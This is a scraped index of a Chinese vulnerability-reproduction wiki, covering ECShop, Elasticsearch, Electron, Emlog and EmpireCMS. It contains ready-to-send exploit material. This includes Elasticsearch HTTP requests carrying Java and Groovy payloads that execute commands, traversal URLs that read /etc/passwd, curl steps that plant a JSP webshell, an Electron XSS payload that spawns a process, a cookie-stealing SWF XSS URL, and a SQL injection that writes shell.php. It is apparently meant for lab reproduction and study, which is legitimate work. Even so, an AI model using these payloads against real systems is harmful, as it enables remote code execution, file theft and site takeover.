serialize($arr); ?> 参考链接 https://cloud.tencent.com/developer/article/1333449 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:14 "},"Web安全/ECShop/Ecshop 4.0.7 从反序列化到类型混淆漏洞/Ecshop 4.0.7 从反序列化到类型混淆漏洞.html":{"url":"Web安全/ECShop/Ecshop 4.0.7 从反序列化到类型混淆漏洞/Ecshop 4.0.7 从反序列化到类型混淆漏洞.html","title":"Ecshop 4.0.7 从反序列化到类型混淆漏洞","keywords":"","body":"Ecshop 从反序列化到类型混淆漏洞 一、漏洞简介 漏洞利用条件 •php 5.6.x •反序列化入口点 •可以触发__wakeup的触发点（在php \\ 二、漏洞影响 Ecshop 4.0.7 三、复现过程 首先我们需要找到一个反序列化入口点，这里我们可以全局搜索unserialize，挨个看一下我们可以找到两个可控的反序列化入口。 其中一个是search.php line 45 ... { $string = base64_decode(trim($_GET['encode'])); if ($string !== false) { $string = unserialize($string); if ($string !== false) ... 这是一个前台的入口，但可惜的是引入初始化文件在反序列化之后，这也就导致我们没办法找到可以覆盖类变量属性的目标，也就没办法进一步利用。 还有一个是admin/order.php line 229 /* 取得上一个、下一个订单号 */ if (!empty($_COOKIE['ECSCP']['lastfilter'])) { $filter = unserialize(urldecode($_COOKIE['ECSCP']['lastfilter'])); ... 后台的表单页的这个功能就满足我们的要求了，不但可控，还可以用urlencode来绕过ecshop对全局变量的过滤。 这样一来我们就找到了一个可控并且合适的反序列化入口点。 寻找合适的类属性利用链 在寻找利用链之前，我们可以用 get_declared_classes() 来确定在反序列化时，已经声明定义过的类。 在我本地环境下，除了PHP内置类以外我一共找到13个类 [129]=> string(3) \"ECS\" [130]=> string(9) \"ecs_error\" [131]=> string(8) \"exchange\" [132]=> string(9) \"cls_mysql\" [133]=> string(11) \"cls_session\" [134]=> string(12) \"cls_template\" [135]=> string(11) \"certificate\" [136]=> string(6) \"oauth2\" [137]=> string(15) \"oauth2_response\" [138]=> string(14) \"oauth2_request\" [139]=> string(9) \"transport\" [140]=> string(6) \"matrix\" [141]=> string(16) \"leancloud_client\" 从代码中也可以看到在文件头引入了多个库文件 require(dirname(__FILE__) . '/includes/init.php'); require_once(ROOT_PATH . 'includes/lib_order.php'); require_once(ROOT_PATH . 'includes/lib_goods.php'); require_once(ROOT_PATH . 'includes/cls_matrix.php'); include_once(ROOT_PATH . 'includes/cls_certificate.php'); require('leancloud_push.php'); 这里我们主要关注init.php，因为在这个文件中声明了ecshop的大部分通用类。 在逐个看这里面的类变量时，我们可以敏锐的看到一个特殊的变量，由于ecshop的后台结构特殊，页面内容大多都是由模板编译而成，而这个模板类恰好也在init.php中声明 require(ROOT_PATH . 'includes/cls_template.php'); $smarty = new cls_template; 回到order.php中我们寻找与$smarty相关的方法，不难发现，主要集中在两个方法中 ... $smarty->assign('shipping', $shipping); $smarty->display('print.htm'); ... 而这里我们主要把视角集中在display方法上。 粗略的浏览下display方法的逻辑大致是 请求相应的模板文件 --> 经过一系列判断，将相应的模板文件做相应的编译 --> 输出编译后的文件地址 比较重要的代码会在make_compiled这个函数中被定义 function make_compiled($filename) { $name = $this->compile_dir . '/' . basename($filename) . '.php'; ... if ($this->force_compile || $filestat['mtime'] > $expires) { $this->_current_file = $filename; $source = $this->fetch_str(file_get_contents($filename)); if (file_put_contents($name, $source, LOCK_EX) === false) { trigger_error('can\\'t write:' . $name); } $source = $this->_eval($source); } return $source; } 当流程走到这一步的时候，我们需要先找到我们的目标是什么？ 重新审视cls_template.php的代码，我们可以发现涉及到代码执行的只有几个函数。 function get_para($val, $type = 1) // 处理insert外部函数/需要include运行的函数的调用数据 { $pa = $this->str_trim($val); foreach ($pa AS $value) { if (strrpos($value, '=')) { list($a, $b) = explode('=', str_replace(array(' ', '\"', \"'\", '\"'), '', $value)); if ($b{0} == '$') { if ($type) { eval('$para[\\'' . $a . '\\']=' . $this->get_val(substr($b, 1)) . ';'); } else { $para[$a] = $this->get_val(substr($b, 1)); } } else { $para[$a] = $b; } } } return $para; } get_para只在select中调用，但是没找到能触发select的地方。 然后是pop_vars function pop_vars() { $key = array_pop($this->_temp_key); $val = array_pop($this->_temp_val); if (!empty($key)) { eval($key); } } 恰好配合GMP我们可以控制$this->_temp_key变量，所以我们只要能在上面的流程中找到任意地方调用这个方法，我们就可以配合变量覆盖构造一个代码执行。 在回看刚才的代码流程时，我们从编译后的PHP文件中找到了这样的代码 order_info.htm.php pop_vars();; ?> 在遍历完表单之后，正好会触发pop_vars。 这样一来，只要我们控制覆盖cls_template变量的_temp_key属性，我们就可以完成一次getshell 最终利用效果 1.png 参考链接 https://mp.weixin.qq.com/s/KD0fKbSA9SUGY1lGas1xSA Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:12 "},"Web安全/Elasticsearch/（CVE-2014-3120）ElasticSearch 命令执行漏洞/（CVE-2014-3120）ElasticSearch 命令执行漏洞.html":{"url":"Web安全/Elasticsearch/（CVE-2014-3120）ElasticSearch 命令执行漏洞/（CVE-2014-3120）ElasticSearch 命令执行漏洞.html","title":"（CVE-2014-3120）ElasticSearch 命令执行漏洞","keywords":"","body":"（CVE-2014-3120）ElasticSearch 命令执行漏洞 一、漏洞简介 老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。 二、漏洞影响 elasticsearch版本：v1.1.1 三、复现过程 编译及运行环境： docker-compose build docker-compose up -d 将Java代码放入json中： { \"size\": 1, \"query\": { \"filtered\": { \"query\": { \"match_all\": { } } } }, \"script_fields\": { \"command\": { \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"id\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\" } } } 首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据： POST /website/blog/ HTTP/1.1 Host: your-ip:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 25 { \"name\": \"phithon\" } 然后，执行任意代码： POST /_search?pretty HTTP/1.1 Host: your-ip:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 343 { \"size\": 1, \"query\": { \"filtered\": { \"query\": { \"match_all\": { } } } }, \"script_fields\": { \"command\": { \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"id\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\" } } } 结果如图： ElasticSearch命令执行漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/elasticsearch/CVE-2014-3120/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:18 "},"Web安全/Elasticsearch/（CVE-2015-1427）ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞/（CVE-2015-1427）ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞.html":{"url":"Web安全/Elasticsearch/（CVE-2015-1427）ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞/（CVE-2015-1427）ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞.html","title":"（CVE-2015-1427）ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞","keywords":"","body":"（CVE-2015-1427）ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞 一、漏洞简介 CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。 二、漏洞影响 elasticsearch版本：v1.4.2 三、复现过程 Groovy语言\"沙盒\" ElasticSearch支持使用\"在沙盒中的\"Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法： 既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射 Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言 所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。 Java沙盒绕过法： java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText() Goovy直接执行命令法： def command='id';def res=command.execute().text;res 漏洞复现 编译及运行测试环境 docker-compose build docker-compose up -d 由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据： POST /website/blog/ HTTP/1.1 Host: your-ip:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 25 { \"name\": \"test\" } 然后发送包含payload的数据包，执行任意命令： POST /_search?pretty HTTP/1.1 Host: your-ip:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/text Content-Length: 156 {\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}} ElasticSearchGroovy沙盒绕过&&代码执行漏洞/media/rId26.png) 参考链接 https://vulhub.org/\\#/environments/elasticsearch/CVE-2015-1427/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:19 "},"Web安全/Elasticsearch/（CVE-2015-3337）ElasticSearch 目录穿越漏洞/（CVE-2015-3337）ElasticSearch 目录穿越漏洞.html":{"url":"Web安全/Elasticsearch/（CVE-2015-3337）ElasticSearch 目录穿越漏洞/（CVE-2015-3337）ElasticSearch 目录穿越漏洞.html","title":"（CVE-2015-3337）ElasticSearch 目录穿越漏洞","keywords":"","body":"（CVE-2015-3337）ElasticSearch 目录穿越漏洞 一、漏洞简介 在安装了具有\"site\"功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。 二、漏洞影响 影响版本：1.4.5以下/1.5.2以下 三、复现过程 编译及运行测试环境 docker-compose build docker-compose up -d 测试环境默认安装了一个插件：elasticsearch-head，主页在此：https://github.com/mobz/elasticsearch-head 访问http://www.0-sec.org:9200/_plugin/head/../../../../../../../../../etc/passwd读取任意文件（不要在浏览器访问）： ElasticSearch目录穿越漏洞/media/rId24.png) head插件 head插件提供了elasticsearch的前端页面，访问 http://www.0-sec.org:9200/_plugin/head/ 即可看到，不多说了。 参考链接 https://vulhub.org/\\#/environments/elasticsearch/CVE-2015-3337/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:19 "},"Web安全/Elasticsearch/（CVE-2015-5531）ElasticSearch 目录穿越漏洞/（CVE-2015-5531）ElasticSearch 目录穿越漏洞.html":{"url":"Web安全/Elasticsearch/（CVE-2015-5531）ElasticSearch 目录穿越漏洞/（CVE-2015-5531）ElasticSearch 目录穿越漏洞.html","title":"（CVE-2015-5531）ElasticSearch 目录穿越漏洞","keywords":"","body":"（CVE-2015-5531）ElasticSearch 目录穿越漏洞 一、漏洞简介 elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。 二、漏洞影响 ElasticSearch 1.6.1以下 三、复现过程 1. 新建一个仓库 PUT /_snapshot/test HTTP/1.1 Host: your-ip:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 108 { \"type\": \"fs\", \"settings\": { \"location\": \"/usr/share/elasticsearch/repo/test\" } } ElasticSearch目录穿越漏洞/media/rId25.png) 2. 创建一个快照 PUT /_snapshot/test2 HTTP/1.1 Host: your-ip:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 108 { \"type\": \"fs\", \"settings\": { \"location\": \"/usr/share/elasticsearch/repo/test/snapshot-backdata\" } } ElasticSearch目录穿越漏洞/media/rId27.png) 3. 目录穿越读取任意文件 访问 http://www.0-sec.org:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd ElasticSearch目录穿越漏洞/media/rId29.png) 如上图，在错误信息中包含文件内容（编码后），对其进行解码即可获得文件： ElasticSearch目录穿越漏洞/media/rId30.png) 参考链接 https://vulhub.org/\\#/environments/elasticsearch/CVE-2015-5531/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:24 "},"Web安全/Elasticsearch/Elasticsearch 1.5.x 后台getshell/Elasticsearch 1.5.x 后台getshell.html":{"url":"Web安全/Elasticsearch/Elasticsearch 1.5.x 后台getshell/Elasticsearch 1.5.x 后台getshell.html","title":"Elasticsearch 1.5.x 后台getshell","keywords":"","body":"Elasticsearch 1.5.x 后台getshell 一、漏洞简介 ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。 所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。 和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项path.repo中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。 二、漏洞影响 Elasticsearch 1.5.x 三、复现过程 测试环境 编译与启动测试环境： docker-compose build docker-compose up -d 简单介绍一下本测试环境。本测试环境同时运行了Tomcat和ElasticSearch，Tomcat目录在/usr/local/tomcat，web目录是/usr/local/tomcat/webapps；ElasticSearch目录在/usr/share/elasticsearch。 我们的目标就是利用ElasticSearch，在/usr/local/tomcat/webapps目录下写入我们的webshell。 漏洞复现 首先创建一个恶意索引文档： curl -XPOST http://www.0-sec.org:9200/yz.jsp/yz.jsp/1 -d' {\"\":\"test\"} ' 再创建一个恶意的存储库，其中location的值即为我要写入的路径。 园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。 curl -XPUT 'http://www.0-sec.org:9200/_snapshot/yz.jsp' -d '{ \"type\": \"fs\", \"settings\": { \"location\": \"/usr/local/tomcat/webapps/wwwroot/\", \"compress\": false } }' 存储库验证并创建: curl -XPUT \"http://www.0-sec.org:9200/_snapshot/yz.jsp/yz.jsp\" -d '{ \"indices\": \"yz.jsp\", \"ignore_unavailable\": \"true\", \"include_global_state\": false }' 完成！ 访问http://www.0-sec.org:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。 该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：http://www.0-sec.org:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了： 参考链接 https://vulhub.org/\\#/environments/elasticsearch/WooYun-2015-110216/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:17 "},"Web安全/Elasticsearch/Elasticsearch未授权访问/Elasticsearch未授权访问.html":{"url":"Web安全/Elasticsearch/Elasticsearch未授权访问/Elasticsearch未授权访问.html","title":"Elasticsearch未授权访问","keywords":"","body":"Elasticsearch未授权访问 一、漏洞简介 ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。 二、影响范围 三、复现过程 安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。 http://0-sec.org:9200/\\_cat/indices 里面的indices包含了_river一般就是安装了river了。http://0-sec.org:9200/\\_plugin/head/ web管理界面http://0-sec.org:9200/\\_cat/indiceshttp://0-sec.org:9200/\\_river/\\_search 查看数据库敏感信息http://0-sec.org:9200/\\_nodes 查看节点数据 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:17 "},"Web安全/Electron/（CVE-2018-1000006）Electron 远程命令执行漏洞/（CVE-2018-1000006）Electron 远程命令执行漏洞.html":{"url":"Web安全/Electron/（CVE-2018-1000006）Electron 远程命令执行漏洞/（CVE-2018-1000006）Electron 远程命令执行漏洞.html","title":"（CVE-2018-1000006）Electron 远程命令执行漏洞","keywords":"","body":"（CVE-2018-1000006）Electron 远程命令执行漏洞 一、漏洞简介 在Windows下，如果Electron开发的应用注册了Protocol Handler（允许用户在浏览器中召起该应用），则可能出现一个参数注入漏洞，并最终导致在用户侧执行任意命令。 二、漏洞影响 Electron \\ 三、复现过程 编译APP 执行如下命令编译一个包含漏洞的应用： docker-compose run -e ARCH=64 --rm electron 上述命令中，因为软件需要在Windows平台上运行，所以需要设置ARCH的值为平台的位数：32或64。 编译完成后，再执行如下命令，启动web服务： docker-compose run --rm -p 8080:80 web 此时，访问http://www.0-sec.org:8080/即可看到POC页面。 漏洞复现 首先，在POC页面，点击第一个链接，下载编译好的软件vulhub-app.tar.gz。下载完成后解压，并运行一次： Electron远程命令执行漏洞/media/rId26.png) 这一次将注册Protocol Handler。 然后，再回到POC页面，点击第二个链接，将会弹出目标软件和计算器： Electron远程命令执行漏洞/media/rId27.png) 如果没有成功，可能是浏览器原因。经测试，新版Chrome浏览器点击POC时，会召起vulhub-app，但不会触发该漏洞。 POC 可以直接使用 elec_rce\\elec_rce-win32-x64\\elec_rce.exe 也可以自己打包成exe应用,生成有漏洞的版本应用，以版本1.7.8为例： electron-packager ./test elec_rce --win --out ./elec_rce --arch=x64 --version=0.0.1 --electron-version=1.7.8 --download.mirror=https://npm.taobao.org/mirrors/electron/ https://github.com/ianxtianxt/CVE-2018-1000006-DEMO Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:26 "},"Web安全/Electron/（CVE-2018-15685）Electron WebPreferences 远程命令执行漏洞/（CVE-2018-15685）Electron WebPreferences 远程命令执行漏洞.html":{"url":"Web安全/Electron/（CVE-2018-15685）Electron WebPreferences 远程命令执行漏洞/（CVE-2018-15685）Electron WebPreferences 远程命令执行漏洞.html","title":"（CVE-2018-15685）Electron WebPreferences 远程命令执行漏洞","keywords":"","body":"（CVE-2018-15685）Electron WebPreferences 远程命令执行漏洞 一、漏洞简介 Electron在设置了nodeIntegration=false的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。 二、漏洞影响 GitHub Electron 1.7.15版本，1.8.7版本，2.0.7版本，3.0.0-beta.6版本。 三、复现过程 编译APP 执行如下命令编译一个包含漏洞的应用： docker-compose run -e PLATFORM=win64 --rm electron 其中PLATFORM的值是运行该应用的操作系统，可选项有：win64、win32、mac、linux。 编译完成后，再执行如下命令，启动web服务： docker-compose run --rm -p 8080:80 web 此时，访问http://www.0-sec.org:8080/cve-2018-15685.tar.gz即可下载编译好的应用。 漏洞复现 在本地打开应用： ElectronWebPreferences远程命令执行漏洞/media/rId26.png) 点击提交，输入框中的内容将会显示在应用中，显然这里存在一处XSS漏洞。 我们提交``，发现没有任何反馈，原因就是nodeIntegration=false。 此时，提交POC（Windows）： require(\\'child_process\\').exec(\\'calc.exe\\')');\"> 可见，calc.exe已成功弹出： ElectronWebPreferences远程命令执行漏洞/media/rId27.png) 参考链接 https://vulhub.org/\\#/environments/electron/CVE-2018-15685/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:25 "},"Web安全/Emlog/Emlog 6.0 xss集合/Emlog 6.0 xss集合.html":{"url":"Web安全/Emlog/Emlog 6.0 xss集合/Emlog 6.0 xss集合.html","title":"Emlog 6.0 xss集合","keywords":"","body":"Emlog 6.0 xss集合 一、漏洞简介 二、漏洞影响 Emlog 6.0 三、复现过程 Uploadify SWF XSS Emlog使用了 uploadify.swf 的方式上传文件，文件路径 /include/lib/js/uploadify/uploadify.swf payload http://www.0-sec.org/include/lib/js/uploadify/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//&.swf 效果，可无视浏览器filter： 反射xss 此处的XSS主要发生在cookie上，因为某些页面如 admin/admin_log,admin/sort.php,admin/link.php页面需要在表单中添加了hidden属性的token值，而这个token值直接从用户的cookie中取得，导致了一个反射型XSS 拦截抓包修改cookie中的token值如下： 效果： 侧边栏存储性XSS 为了同样是为了支持HTML代码的输出，没有转义对应的脚本代码标签，导致了存储性的XSS存在 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:27 "},"Web安全/Emlog/Emlog 6.0 后台暴力破解/Emlog 6.0 后台暴力破解.html":{"url":"Web安全/Emlog/Emlog 6.0 后台暴力破解/Emlog 6.0 后台暴力破解.html","title":"Emlog 6.0 后台暴力破解","keywords":"","body":"Emlog 6.0 后台暴力破解 一、漏洞简介 Emlog博客系统默认后台登陆地址为http://域名/admin/login.php而后台登陆时，错误情况下，验证码未刷新，导致可暴力破解登陆管理员账号低危漏洞，但是在emlog5.3.1和6.0测试版本均存在 ... 二、漏洞影响 emlog5.3.1和6.0 三、复现过程 访问 http://0-sec.org:81/admin/ 已知管理员用户名为：admin（可在前端文章页寻找作者用户名） image 登陆后台 随便输入admin admin123 qdiwx，点击登陆 然后burpsuite抓包 CTRL+I尝试暴力破解： 成功爆破出密码，所以再次验证：验证码没消除会话，导致可暴力破解漏洞的存在 四、参考链接 http://www.dyboy.cn/post-900.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:28 "},"Web安全/Emlog/Emlog 6.0 数据库备份与导入功能导致后台getshell/Emlog 6.0 数据库备份与导入功能导致后台getshell.html":{"url":"Web安全/Emlog/Emlog 6.0 数据库备份与导入功能导致后台getshell/Emlog 6.0 数据库备份与导入功能导致后台getshell.html","title":"Emlog 6.0 数据库备份与导入功能导致后台getshell","keywords":"","body":"Emlog 6.0 数据库备份与导入功能导致后台getshell 一、漏洞简介 二、漏洞影响 Emlog\\ 三、复现过程 备份数据库到本地： 修改数据库文件，将备份的数据库文件进行修改，在最后一段添加上自己构造的SQL语句： 这一段sql语句主要功能是：首先判断是否存在emlog_shell数据表，如果存在则删除该表，之后创建一个新的emlog数据表，之后再向该表中添加信息（这里可以填入一句话木马），之后使用select..... into outfile ....将数据表中的表项内容读入到一个shell.php的PHP文件汇总，之后再删除该数据表！ 导入数据库： 之后访问之： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:30 "},"Web安全/Emlog/Emlog phpinfo 泄漏/Emlog phpinfo 泄漏.html":{"url":"Web安全/Emlog/Emlog phpinfo 泄漏/Emlog phpinfo 泄漏.html","title":"Emlog phpinfo 泄漏","keywords":"","body":"Emlog phpinfo 泄漏 一、漏洞简介 需要登陆（至少是网站的会员/作者权限） 二、漏洞影响 三、复现过程 首先看看漏洞出现的位置： 如上图，我们只要构造如下的URL： http://www.0-sec.org:81/admin/index.php?action=phpinfo 直接访问： 四、参考链接 http://www.jeepxie.net/article/687123.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:32 "},"Web安全/Emlog/Emlog 友情链接自助插件存在SQL注入漏洞/Emlog 友情链接自助插件存在SQL注入漏洞.html":{"url":"Web安全/Emlog/Emlog 友情链接自助插件存在SQL注入漏洞/Emlog 友情链接自助插件存在SQL注入漏洞.html","title":"Emlog 友情链接自助插件存在SQL注入漏洞","keywords":"","body":"Emlog 友情链接自助插件存在SQL注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 在该插件当中的link_web.php文件中，直接将用户提交的数据进行了拼接，之后直接带入了查询，未经过任何的过滤操作，由此一个典型的SQL注入漏洞就这样简易的诞生了： 由于这里的参数都没有经过过滤，所以我们可以对任意参数进行验证，进行SQL注入，首先我们可以提交正常的访问请求，之后使用burpsuite进行抓包，之后改包，我们这里以URL为例： 在抓取到数据包之后，我们可以将url改为以下内容： url=http://0-sec.org' union select 1,2,3,4,5,'' into outfile 'c:\\\\phpstudy\\\\www\\\\shell.php' 之后，这条语句会正常执行，同时也会在C:\\phpstudy\\www\\下生成一个shell.php，而且该shell.php中的内容正是我们之前写入的一句话，之后我们可以使用菜刀进行连接。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:33 "},"Web安全/Emlog/Emlog 越权&后台getshell/Emlog 越权&后台getshell.html":{"url":"Web安全/Emlog/Emlog 越权&后台getshell/Emlog 越权&后台getshell.html","title":"Emlog 越权&后台getshell","keywords":"","body":"Emlog 越权&后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 代码分析 安装漏洞 ​ 其实一般代码审计都是从安装文件开始审计，一般安装脚本主要存在如下漏洞： 无验证功能，任意重装覆盖 表单不做过滤写入config.php导致getshell $_GET['step']跳过限制步骤 漏洞文件：install.php ​​首先我们直奔第一个点能否任意重装，我们可以看到必须常量DEL_INSTALLER为1的时候才会触发删除install.php,那么我们追踪DEL_INSTALLER看看 这里可以看到DEL_INSTALLER默认值就是0，所以一般情况下这里是可以任意重装的，我们从黑盒的测试也可以印证这一点。同时表单也做了过滤所以这里也没有后面两种情况。 越权漏洞 ​​在安装完毕后打开config.php看到两个比较奇怪的常量定义：AUTH_KEY和AUTH_COOKIE_NAME从名字来看这连个常量肯定是有一定联系的。如下图： 我们在抓包时候发现了AUTH_COOKIE_NAME这个常量，说明这是一个cookie名。我们继续再代码中追踪这个常量。 我们可以看到在登录验证cookie中使用了这个常量，我们追踪一下cookie值是如何构造的 这里可以看到，调用了emHash这个类方法，并且这里使用了AUTH_KEY这个常量，这里说明这两个常量是有联系的。我们在继续追踪hash_hmac()到底使用key做了什么。 这里对传入的$key也就是AUTH_KEY进行了md5加密到一个二进制字符串中而后分割为64个字节与一个字符*64次的字符串进行异或最后得到两个字符串$ipad,$opad最后再将他们打包拼接用md5加密返回给上级调用。我们再回到上级。 我们知道generateAuthCookie方法中的 $key、$hash是由AUTH_KEY加密而成。最终的cookie是由$user_login 、 $expiration $hash拼接而成，而$expiration是cookie的生存时间，$user_login是用户名。这里可以得知$key、$user_login、$expiration都是固定的那么只要知道AUTH_KEY就有伪造cookie造成越权的可能。 ​例如我们准备两个靶机，一个靶机登陆，获取这个靶机的cookie即可越权登陆另外一个靶机。前提是两个靶机的AUTH_KEY得一致。这里有点鸡肋但是还是有利用的可能。我们将两个靶机的cookie拿出来比较确实是一样的。​ 后台getshell（一） ​​其实上诉两个漏洞已经能够让我们进入后台了，现在的任务就是如何Getshell了。这里我随便看了一下发现后台有设置上传附件后缀的功能。​​​ 但是测试发现，加入php后缀你发现会将phpt替换为X,从源码中可有很直观看到这点。​​​此时我注意到了备份功能，这个后缀是保存在数据库中的，既然我不能直接将后缀写入数据库，那么我能不能通过数据备份恢复的方法写入数据库呢。​​ 这里直接备份所有表，下载下来然后找到写入后缀的语句，加上php,如下​​​​ 导入备份后发现设置中的上传后缀有php​​​ 直接在文章发表出上传PHP文件即可getshell​ 后台getshell（二） 我们还发现这个cms中上传插件的地方可以上传zip，这里我们想如果在插件中插入一句话木马是不是也能getshell?我们找到插件上传的脚本，发现使用了一个叫emUnzip的函数。 我们继续追踪这个函数，发现这个解压函数是使用ZipArchive()类来实现解压缩的。我们可以看到代码755行中获取了压缩包的内部目录/文件的名称 ,并将其分割为数组将第一个元素赋值给了$dir，我们看到switch中plugin选项，这里又将获取的第一个文件夹名称赋值给$plugin_name,使用getFromName方法获取了压缩包是否存在$dir . $plugin_name . \\'.php\\'这个文件。综上这里就是检测压缩包中文件夹里面是否存在一个与文件夹名称一致的PHP文件，最后在再压。这里也没对文件进行其他校验操作。因此我们只要再构造 文件夹名和文件名相同的内容的压缩包，同时由上方代码也可以知道，文件将会被解压到 /content/plugins/a/a.php(文件夹名称a) 构建压缩包上传插件： 四、参考链接 https://xz.aliyun.com/t/6861 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:34 "},"Web安全/EmpireCMS/（CVE-2018-18086）EmpireCMS 7.5 后台getshell/（CVE-2018-18086）EmpireCMS 7.5 后台getshell.html":{"url":"Web安全/EmpireCMS/（CVE-2018-18086）EmpireCMS 7.5 后台getshell/（CVE-2018-18086）EmpireCMS 7.5 后台getshell.html","title":"（CVE-2018-18086）EmpireCMS 7.5 后台getshell","keywords":"","body":"（CVE-2018-18086）EmpireCMS 7.5 后台getshell 一、漏洞简介 二、漏洞影响 EmpireCMS 7.5 三、复现过程 查看/e/admin/ecmsmod.php代码 1.png 跟随LoadInMod函数来到/e/class/moddofun.php,可以看到上传文件处使用make_password(10)对时间进行加密然后拼接成为上传的文件名,这样就无法得到用户名 2.png 继续浏览代码,在下面发现@include($path),直接包含了这个上传的文件,这时如果在上传文件中添加可以创建文件的代码就可以绕过找不到文件名这个限制了。 3.png 我们可以构造如下payload: ”); ?> 登录后台,点击如下图所示 4.png 点击\"导入系统模型\"之后进入如下界面5.png 可以上传一个内容为php代码的.mod后缀的文件,内容如下: 6.png 上传1.php.mod文件 7.png 查看文件,可以看到成功上传 8.png 浏览访问http://www.0-sec.org/e/admin/shell.php,可以看到成功执行代码 9.png 